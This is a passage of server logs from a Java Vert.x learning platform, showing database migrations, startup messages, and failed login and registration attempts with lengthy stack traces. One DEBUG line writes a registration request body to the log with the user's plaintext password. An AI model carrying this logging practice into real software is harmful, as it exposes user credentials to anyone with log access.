	at org.postgresql.jdbc.PgStatement.executeInternal(PgStatement.java:498)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:415)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:335)
	at org.postgresql.jdbc.PgStatement.executeCachedSql(PgStatement.java:321)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:297)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:292)
	at org.flywaydb.core.internal.jdbc.JdbcTemplate.executeStatement(JdbcTemplate.java:210)
	at org.flywaydb.core.internal.sqlscript.ParsedSqlStatement.execute(ParsedSqlStatement.java:97)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:213)
	... 36 common frames omitted
2026-03-12 00:32:10.694 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Starting CyberSkill Platform...
2026-03-12 00:32:10.696 [vert.x-eventloop-thread-1] INFO  com.cyberskill.config.AppConfig - Application properties loaded successfully
2026-03-12 00:32:10.799 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Running database migrations...
2026-03-12 00:32:10.928 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - Flyway OSS Edition 10.4.1 by Redgate
2026-03-12 00:32:10.929 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - 
2026-03-12 00:32:10.929 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - See release notes here: https://rd.gt/416ObMi
2026-03-12 00:32:11.110 [vert.x-eventloop-thread-1] INFO  org.flywaydb.core.FlywayExecutor - Database: jdbc:postgresql://localhost:5432/cyberskill (PostgreSQL 16.3)
2026-03-12 00:32:11.140 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.JdbcTableSchemaHistory - Schema history table "public"."flyway_schema_history" does not exist yet
2026-03-12 00:32:11.143 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbValidate - Successfully validated 3 migrations (execution time 00:00.017s)
2026-03-12 00:32:11.159 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.JdbcTableSchemaHistory - Creating Schema History table "public"."flyway_schema_history" ...
2026-03-12 00:32:11.297 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Current version of schema "public": << Empty Schema >>
2026-03-12 00:32:11.327 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "1 - Initial Schema"
2026-03-12 00:32:11.722 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "2 - Sample Learning Content"
2026-03-12 00:32:11.770 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "3 - Additional Learning Paths"
2026-03-12 00:32:11.805 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Successfully applied 3 migrations to schema "public", now at version v3 (execution time 00:00.425s)
2026-03-12 00:32:11.810 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Applied 3 database migration(s)
2026-03-12 00:32:11.812 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Initializing database connection pool...
2026-03-12 00:32:11.844 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Database connection pool initialized
2026-03-12 00:32:11.844 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Initializing repositories...
2026-03-12 00:32:11.856 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Repositories initialized
2026-03-12 00:32:11.859 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Initializing services...
2026-03-12 00:32:11.863 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Services initialized
2026-03-12 00:32:11.863 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Initializing handlers...
2026-03-12 00:32:11.867 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Handlers initialized
2026-03-12 00:32:12.034 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ CyberSkill Platform started successfully
2026-03-12 00:32:12.035 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Server listening on http://0.0.0.0:8080
2026-03-12 00:32:12.035 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ API available at http://0.0.0.0:8080/api
2026-03-12 00:32:12.035 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Admin dashboard at http://0.0.0.0:8080/admin
2026-03-12 00:32:12.035 [vert.x-eventloop-thread-0] INFO  i.v.c.i.l.c.VertxIsolatedDeployer - Succeeded in deploying verticle
2026-03-12 00:32:19.764 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /
2026-03-12 00:32:19.764 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - 📄 GET / - Rendering home page
2026-03-12 00:32:19.894 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✅ Home page rendered successfully
2026-03-12 00:32:19.979 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /css/styles.css
2026-03-12 00:32:19.989 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /js/main.js
2026-03-12 00:32:20.078 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /favicon.ico
2026-03-12 00:33:24.490 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Stopping CyberSkill Platform...
2026-03-12 00:33:24.493 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ CyberSkill Platform stopped
2026-03-12 00:34:06.098 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Starting CyberSkill Platform...
2026-03-12 00:34:06.100 [vert.x-eventloop-thread-1] INFO  com.cyberskill.config.AppConfig - Application properties loaded successfully
2026-03-12 00:34:06.192 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Running database migrations...
2026-03-12 00:34:06.295 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - Flyway OSS Edition 10.4.1 by Redgate
2026-03-12 00:34:06.295 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - 
2026-03-12 00:34:06.295 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - See release notes here: https://rd.gt/416ObMi
2026-03-12 00:34:06.485 [vert.x-eventloop-thread-1] INFO  org.flywaydb.core.FlywayExecutor - Database: jdbc:postgresql://localhost:5432/cyberskill (PostgreSQL 16.3)
2026-03-12 00:34:06.523 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbValidate - Successfully validated 3 migrations (execution time 00:00.024s)
2026-03-12 00:34:06.579 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Current version of schema "public": 3
2026-03-12 00:34:06.582 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Schema "public" is up to date. No migration necessary.
2026-03-12 00:34:06.585 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Applied 0 database migration(s)
2026-03-12 00:34:06.588 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Initializing database connection pool...
2026-03-12 00:34:06.603 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Database connection pool initialized
2026-03-12 00:34:06.603 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Initializing repositories...
2026-03-12 00:34:06.610 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Repositories initialized
2026-03-12 00:34:06.611 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Initializing services...
2026-03-12 00:34:06.616 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Services initialized
2026-03-12 00:34:06.616 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Initializing handlers...
2026-03-12 00:34:06.619 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Handlers initialized
2026-03-12 00:34:06.802 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ CyberSkill Platform started successfully
2026-03-12 00:34:06.803 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Server listening on http://0.0.0.0:8080
2026-03-12 00:34:06.803 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ API available at http://0.0.0.0:8080/api
2026-03-12 00:34:06.803 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Admin dashboard at http://0.0.0.0:8080/admin
2026-03-12 00:34:06.804 [vert.x-eventloop-thread-0] INFO  i.v.c.i.l.c.VertxIsolatedDeployer - Succeeded in deploying verticle
2026-03-12 00:34:14.035 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /
2026-03-12 00:34:14.035 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - 📄 GET / - Rendering home page
2026-03-12 00:34:14.179 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✅ Home page rendered successfully
2026-03-12 00:34:14.247 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /css/styles.css
2026-03-12 00:34:14.255 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /js/main.js
2026-03-12 00:34:14.335 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /favicon.ico
2026-03-12 00:34:57.455 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /login
2026-03-12 00:34:57.455 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - 📄 GET /login - Rendering login page
2026-03-12 00:34:57.485 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✅ Login page rendered successfully
2026-03-12 00:34:57.567 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /css/styles.css
2026-03-12 00:34:57.592 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /favicon.ico
2026-03-12 00:35:15.035 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - POST /api/auth/login
2026-03-12 00:35:15.051 [vert.x-eventloop-thread-1] INFO  com.cyberskill.service.AuthService - Login attempt for: testuser@mail.com
2026-03-12 00:35:15.292 [vert.x-eventloop-thread-1] ERROR com.cyberskill.service.AuthService - Login failed for: testuser@mail.com
java.lang.IllegalArgumentException: Invalid email or password
	at com.cyberskill.service.AuthService.lambda$login$0(AuthService.java:82)
	at io.vertx.core.impl.future.Composition.onSuccess(Composition.java:38)
	at io.vertx.core.impl.future.FutureImpl$ListenerArray.onSuccess(FutureImpl.java:297)
	at io.vertx.core.impl.future.FutureBase.emitSuccess(FutureBase.java:66)
	at io.vertx.core.impl.future.FutureImpl.tryComplete(FutureImpl.java:246)
	at io.vertx.core.impl.future.Mapping.onSuccess(Mapping.java:40)
	at io.vertx.core.impl.future.FutureBase.emitSuccess(FutureBase.java:66)
	at io.vertx.core.impl.future.FutureImpl.tryComplete(FutureImpl.java:246)
	at io.vertx.sqlclient.impl.QueryResultBuilder.tryComplete(QueryResultBuilder.java:88)
	at io.vertx.sqlclient.impl.QueryResultBuilder.tryComplete(QueryResultBuilder.java:32)
	at io.vertx.core.Promise.complete(Promise.java:66)
	at io.vertx.core.Promise.handle(Promise.java:51)
	at io.vertx.core.Promise.handle(Promise.java:29)
	at io.vertx.core.impl.future.FutureImpl$4.onSuccess(FutureImpl.java:176)
	at io.vertx.core.impl.future.FutureBase.emitSuccess(FutureBase.java:66)
	at io.vertx.core.impl.future.FutureImpl.tryComplete(FutureImpl.java:246)
	at io.vertx.core.impl.future.Composition$1.onSuccess(Composition.java:62)
	at io.vertx.core.impl.future.FutureBase.emitSuccess(FutureBase.java:66)
	at io.vertx.core.impl.future.FutureImpl.tryComplete(FutureImpl.java:246)
	at io.vertx.core.impl.future.Transformation$1.onSuccess(Transformation.java:63)
	at io.vertx.core.impl.future.FutureBase.emitSuccess(FutureBase.java:66)
	at io.vertx.core.impl.future.FutureImpl.addListener(FutureImpl.java:231)
	at io.vertx.core.impl.future.Transformation.onSuccess(Transformation.java:44)
	at io.vertx.core.impl.future.FutureBase.lambda$emitSuccess$0(FutureBase.java:60)
	at io.vertx.core.impl.ContextImpl.execute(ContextImpl.java:305)
	at io.vertx.core.impl.DuplicatedContext.execute(DuplicatedContext.java:181)
	at io.vertx.core.impl.future.FutureBase.emitSuccess(FutureBase.java:57)
	at io.vertx.core.impl.future.FutureImpl.tryComplete(FutureImpl.java:246)
	at io.vertx.core.impl.future.PromiseImpl.onSuccess(PromiseImpl.java:49)
	at io.vertx.core.impl.future.PromiseImpl.handle(PromiseImpl.java:41)
	at io.vertx.core.impl.future.PromiseImpl.handle(PromiseImpl.java:23)
	at io.vertx.sqlclient.impl.command.CommandResponse.fire(CommandResponse.java:46)
	at io.vertx.sqlclient.impl.SocketConnectionBase.handleMessage(SocketConnectionBase.java:324)
	at io.vertx.pgclient.impl.PgSocketConnection.handleMessage(PgSocketConnection.java:114)
	at io.vertx.sqlclient.impl.SocketConnectionBase.lambda$init$0(SocketConnectionBase.java:137)
	at io.vertx.core.impl.ContextImpl.emit(ContextImpl.java:335)
	at io.vertx.core.impl.ContextImpl.emit(ContextImpl.java:328)
	at io.vertx.core.net.impl.NetSocketImpl.handleMessage(NetSocketImpl.java:378)
	at io.vertx.core.net.impl.ConnectionBase.read(ConnectionBase.java:159)
	at io.vertx.core.net.impl.VertxHandler.channelRead(VertxHandler.java:153)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:442)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:412)
	at io.netty.channel.CombinedChannelDuplexHandler$DelegatingChannelHandlerContext.fireChannelRead(CombinedChannelDuplexHandler.java:436)
	at io.vertx.pgclient.impl.codec.PgDecoder.fireCommandResponse(PgDecoder.java:52)
	at io.vertx.pgclient.impl.codec.PgCommandCodec.handleReadyForQuery(PgCommandCodec.java:137)
	at io.vertx.pgclient.impl.codec.PgDecoder.decodeReadyForQuery(PgDecoder.java:248)
	at io.vertx.pgclient.impl.codec.PgDecoder.channelRead(PgDecoder.java:107)
	at io.netty.channel.CombinedChannelDuplexHandler.channelRead(CombinedChannelDuplexHandler.java:251)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:442)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:412)
	at io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1410)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:440)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:919)
	at io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:166)
	at io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:788)
	at io.netty.channel.nio.NioEventLoop.processSelectedKeysOptimized(NioEventLoop.java:724)
	at io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:650)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:562)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
2026-03-12 00:35:15.296 [vert.x-eventloop-thread-1] ERROR com.cyberskill.handler.AuthHandler - Login failed for: testuser@mail.com
java.lang.IllegalArgumentException: Invalid email or password
	at com.cyberskill.service.AuthService.lambda$login$0(AuthService.java:82)
	at io.vertx.core.impl.future.Composition.onSuccess(Composition.java:38)
	at io.vertx.core.impl.future.FutureImpl$ListenerArray.onSuccess(FutureImpl.java:297)
	at io.vertx.core.impl.future.FutureBase.emitSuccess(FutureBase.java:66)
	at io.vertx.core.impl.future.FutureImpl.tryComplete(FutureImpl.java:246)
	at io.vertx.core.impl.future.Mapping.onSuccess(Mapping.java:40)
	at io.vertx.core.impl.future.FutureBase.emitSuccess(FutureBase.java:66)
	at io.vertx.core.impl.future.FutureImpl.tryComplete(FutureImpl.java:246)
	at io.vertx.sqlclient.impl.QueryResultBuilder.tryComplete(QueryResultBuilder.java:88)
	at io.vertx.sqlclient.impl.QueryResultBuilder.tryComplete(QueryResultBuilder.java:32)
	at io.vertx.core.Promise.complete(Promise.java:66)
	at io.vertx.core.Promise.handle(Promise.java:51)
	at io.vertx.core.Promise.handle(Promise.java:29)
	at io.vertx.core.impl.future.FutureImpl$4.onSuccess(FutureImpl.java:176)
	at io.vertx.core.impl.future.FutureBase.emitSuccess(FutureBase.java:66)
	at io.vertx.core.impl.future.FutureImpl.tryComplete(FutureImpl.java:246)
	at io.vertx.core.impl.future.Composition$1.onSuccess(Composition.java:62)
	at io.vertx.core.impl.future.FutureBase.emitSuccess(FutureBase.java:66)
	at io.vertx.core.impl.future.FutureImpl.tryComplete(FutureImpl.java:246)
	at io.vertx.core.impl.future.Transformation$1.onSuccess(Transformation.java:63)
	at io.vertx.core.impl.future.FutureBase.emitSuccess(FutureBase.java:66)
	at io.vertx.core.impl.future.FutureImpl.addListener(FutureImpl.java:231)
	at io.vertx.core.impl.future.Transformation.onSuccess(Transformation.java:44)
	at io.vertx.core.impl.future.FutureBase.lambda$emitSuccess$0(FutureBase.java:60)
	at io.vertx.core.impl.ContextImpl.execute(ContextImpl.java:305)
	at io.vertx.core.impl.DuplicatedContext.execute(DuplicatedContext.java:181)
	at io.vertx.core.impl.future.FutureBase.emitSuccess(FutureBase.java:57)
	at io.vertx.core.impl.future.FutureImpl.tryComplete(FutureImpl.java:246)
	at io.vertx.core.impl.future.PromiseImpl.onSuccess(PromiseImpl.java:49)
	at io.vertx.core.impl.future.PromiseImpl.handle(PromiseImpl.java:41)
	at io.vertx.core.impl.future.PromiseImpl.handle(PromiseImpl.java:23)
	at io.vertx.sqlclient.impl.command.CommandResponse.fire(CommandResponse.java:46)
	at io.vertx.sqlclient.impl.SocketConnectionBase.handleMessage(SocketConnectionBase.java:324)
	at io.vertx.pgclient.impl.PgSocketConnection.handleMessage(PgSocketConnection.java:114)
	at io.vertx.sqlclient.impl.SocketConnectionBase.lambda$init$0(SocketConnectionBase.java:137)
	at io.vertx.core.impl.ContextImpl.emit(ContextImpl.java:335)
	at io.vertx.core.impl.ContextImpl.emit(ContextImpl.java:328)
	at io.vertx.core.net.impl.NetSocketImpl.handleMessage(NetSocketImpl.java:378)
	at io.vertx.core.net.impl.ConnectionBase.read(ConnectionBase.java:159)
	at io.vertx.core.net.impl.VertxHandler.channelRead(VertxHandler.java:153)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:442)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:412)
	at io.netty.channel.CombinedChannelDuplexHandler$DelegatingChannelHandlerContext.fireChannelRead(CombinedChannelDuplexHandler.java:436)
	at io.vertx.pgclient.impl.codec.PgDecoder.fireCommandResponse(PgDecoder.java:52)
	at io.vertx.pgclient.impl.codec.PgCommandCodec.handleReadyForQuery(PgCommandCodec.java:137)
	at io.vertx.pgclient.impl.codec.PgDecoder.decodeReadyForQuery(PgDecoder.java:248)
	at io.vertx.pgclient.impl.codec.PgDecoder.channelRead(PgDecoder.java:107)
	at io.netty.channel.CombinedChannelDuplexHandler.channelRead(CombinedChannelDuplexHandler.java:251)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:442)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:412)
	at io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1410)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:440)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:919)
	at io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:166)
	at io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:788)
	at io.netty.channel.nio.NioEventLoop.processSelectedKeysOptimized(NioEventLoop.java:724)
	at io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:650)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:562)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
2026-03-12 00:35:21.575 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /register
2026-03-12 00:35:21.577 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - 📄 GET /register - Rendering registration page
2026-03-12 00:35:21.624 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✅ Register page rendered successfully
2026-03-12 00:35:21.781 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /css/styles.css
2026-03-12 00:35:21.837 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /favicon.ico
2026-03-12 00:35:49.462 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - POST /api/auth/register
2026-03-12 00:35:49.466 [vert.x-eventloop-thread-1] INFO  com.cyberskill.handler.AuthHandler - 🔐 POST /api/auth/register - Registration request received
2026-03-12 00:35:49.466 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.handler.AuthHandler - Request body: {
  "username" : "testuser",
  "email" : "testuser@mail.com",
  "password" : "Test@123"
}
2026-03-12 00:35:49.466 [vert.x-eventloop-thread-1] INFO  com.cyberskill.handler.AuthHandler - Registration attempt for username: testuser, email: testuser@mail.com
2026-03-12 00:35:49.466 [vert.x-eventloop-thread-1] INFO  com.cyberskill.handler.AuthHandler - Calling authService.register() for user: testuser
2026-03-12 00:35:49.466 [vert.x-eventloop-thread-1] INFO  com.cyberskill.service.AuthService - Attempting to register user: testuser@mail.com
2026-03-12 00:35:49.473 [vert.x-eventloop-thread-1] ERROR com.cyberskill.service.AuthService - Registration failed for: testuser@mail.com
java.lang.IllegalArgumentException: Username already taken
	at com.cyberskill.service.AuthService.lambda$register$1(AuthService.java:52)
	at io.vertx.core.impl.future.Composition.onSuccess(Composition.java:38)
	at io.vertx.core.impl.future.FutureBase.emitSuccess(FutureBase.java:66)
	at io.vertx.core.impl.future.FutureImpl.tryComplete(FutureImpl.java:246)
	at io.vertx.core.impl.future.Composition$1.onSuccess(Composition.java:62)
	at io.vertx.core.impl.future.FutureImpl$ListenerArray.onSuccess(FutureImpl.java:297)
	at io.vertx.core.impl.future.FutureBase.emitSuccess(FutureBase.java:66)
	at io.vertx.core.impl.future.FutureImpl.tryComplete(FutureImpl.java:246)
	at io.vertx.core.impl.future.Mapping.onSuccess(Mapping.java:40)
	at io.vertx.core.impl.future.FutureBase.emitSuccess(FutureBase.java:66)
	at io.vertx.core.impl.future.FutureImpl.tryComplete(FutureImpl.java:246)
	at io.vertx.sqlclient.impl.QueryResultBuilder.tryComplete(QueryResultBuilder.java:88)
	at io.vertx.sqlclient.impl.QueryResultBuilder.tryComplete(QueryResultBuilder.java:32)
	at io.vertx.core.Promise.complete(Promise.java:66)
	at io.vertx.core.Promise.handle(Promise.java:51)
	at io.vertx.core.Promise.handle(Promise.java:29)
	at io.vertx.core.impl.future.FutureImpl$4.onSuccess(FutureImpl.java:176)
	at io.vertx.core.impl.future.FutureBase.emitSuccess(FutureBase.java:66)
	at io.vertx.core.impl.future.FutureImpl.tryComplete(FutureImpl.java:246)
	at io.vertx.core.impl.future.Composition$1.onSuccess(Composition.java:62)
	at io.vertx.core.impl.future.FutureBase.emitSuccess(FutureBase.java:66)
	at io.vertx.core.impl.future.FutureImpl.tryComplete(FutureImpl.java:246)
	at io.vertx.core.impl.future.Transformation$1.onSuccess(Transformation.java:63)
	at io.vertx.core.impl.future.FutureBase.emitSuccess(FutureBase.java:66)
	at io.vertx.core.impl.future.FutureImpl.addListener(FutureImpl.java:231)
	at io.vertx.core.impl.future.Transformation.onSuccess(Transformation.java:44)
	at io.vertx.core.impl.future.FutureBase.lambda$emitSuccess$0(FutureBase.java:60)
	at io.vertx.core.impl.ContextImpl.execute(ContextImpl.java:305)
	at io.vertx.core.impl.DuplicatedContext.execute(DuplicatedContext.java:181)
	at io.vertx.core.impl.future.FutureBase.emitSuccess(FutureBase.java:57)
	at io.vertx.core.impl.future.FutureImpl.tryComplete(FutureImpl.java:246)
	at io.vertx.core.impl.future.PromiseImpl.onSuccess(PromiseImpl.java:49)
	at io.vertx.core.impl.future.PromiseImpl.handle(PromiseImpl.java:41)
	at io.vertx.core.impl.future.PromiseImpl.handle(PromiseImpl.java:23)
	at io.vertx.sqlclient.impl.command.CommandResponse.fire(CommandResponse.java:46)
	at io.vertx.sqlclient.impl.SocketConnectionBase.handleMessage(SocketConnectionBase.java:324)
	at io.vertx.pgclient.impl.PgSocketConnection.handleMessage(PgSocketConnection.java:114)
	at io.vertx.sqlclient.impl.SocketConnectionBase.lambda$init$0(SocketConnectionBase.java:137)
	at io.vertx.core.impl.ContextImpl.emit(ContextImpl.java:335)
	at io.vertx.core.impl.ContextImpl.emit(ContextImpl.java:328)
	at io.vertx.core.net.impl.NetSocketImpl.handleMessage(NetSocketImpl.java:378)
	at io.vertx.core.net.impl.ConnectionBase.read(ConnectionBase.java:159)
	at io.vertx.core.net.impl.VertxHandler.channelRead(VertxHandler.java:153)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:442)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:412)
	at io.netty.channel.CombinedChannelDuplexHandler$DelegatingChannelHandlerContext.fireChannelRead(CombinedChannelDuplexHandler.java:436)
	at io.vertx.pgclient.impl.codec.PgDecoder.fireCommandResponse(PgDecoder.java:52)
	at io.vertx.pgclient.impl.codec.PgCommandCodec.handleReadyForQuery(PgCommandCodec.java:137)
	at io.vertx.pgclient.impl.codec.PgDecoder.decodeReadyForQuery(PgDecoder.java:248)
	at io.vertx.pgclient.impl.codec.PgDecoder.channelRead(PgDecoder.java:107)
	at io.netty.channel.CombinedChannelDuplexHandler.channelRead(CombinedChannelDuplexHandler.java:251)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:442)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:412)
	at io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1410)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:440)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:919)
	at io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:166)
	at io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:788)
	at io.netty.channel.nio.NioEventLoop.processSelectedKeysOptimized(NioEventLoop.java:724)
	at io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:650)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:562)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
2026-03-12 00:35:49.474 [vert.x-eventloop-thread-1] ERROR com.cyberskill.handler.AuthHandler - Registration failed
java.lang.IllegalArgumentException: Username already taken
	at com.cyberskill.service.AuthService.lambda$register$1(AuthService.java:52)
	at io.vertx.core.impl.future.Composition.onSuccess(Composition.java:38)
